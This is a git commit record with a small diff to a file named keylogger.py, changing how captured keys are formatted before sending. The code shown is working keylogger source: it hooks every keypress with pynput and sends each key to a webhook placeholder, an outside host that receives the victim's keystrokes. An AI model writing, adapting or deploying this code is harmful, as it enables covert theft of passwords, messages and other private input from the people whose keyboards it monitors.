fd1cbc9416ea136f637d1b91991ac1f895780ed3
Isi 82 <81757363+isi-82@users.noreply.github.com>
2021-10-08 14:03:25 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 
 hook = Webhook("Webhook-URL")
 def on_press(key):
-    hook.send(str(key))
+    hook.send("```\n"+str(key)+"\n```")
 
 with Listener(on_press=on_press) as listener:
     listener.join()
